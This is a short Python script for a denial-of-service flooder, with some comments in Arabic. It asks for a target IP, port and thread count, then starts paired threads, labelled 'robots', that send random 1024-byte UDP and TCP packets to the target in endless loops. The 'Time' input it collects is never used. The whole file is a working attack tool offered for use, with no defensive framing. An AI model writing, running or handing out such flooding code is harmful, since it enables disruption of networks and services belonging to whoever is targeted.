import random
import socket
import threading
import os
import time
from colorama import Fore, init

init()

###### MESSAGE MIKA ON TOP! #####
os.system("clear")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))

# قائمة بأسماء الروبوتات
robot_names = ["Robot1", "Robot2", "Robot3", "Robot4", "Robot5"]

def udp_attack(robot_name):
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            s.sendto(data, addr)
            print(f"{Fore.GREEN}Send UDP Packet To {Fore.RED}{ip}:{port}{Fore.WHITE} from {Fore.BLUE}{robot_name}{Fore.WHITE}")
        except:
            print("[!] Error!!!")

def tcp_attack(robot_name):
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            print(f"{Fore.GREEN}Send TCP Packet To {Fore.RED}{ip}:{port}{Fore.WHITE} from {Fore.BLUE}{robot_name}{Fore.WHITE}")
        except:
            print("[!] Error!!!")

# دالة لإنشاء الروبوتات وتشغيل الهجمات
def create_robots():
    for _ in range(threads):
        # اختيار اسم الروبوت من القائمة بشكل عشوائي
        robot_name = random.choice(robot_names)
        # تشغيل هجمة UDP بواسطة الروبوت
        th_udp = threading.Thread(target=udp_attack, args=(robot_name,))
        th_udp.start()
        # تشغيل هجمة TCP بواسطة الروبوت
        th_tcp = threading.Thread(target=tcp_attack, args=(robot_name,))
        th_tcp.start()

create_robots()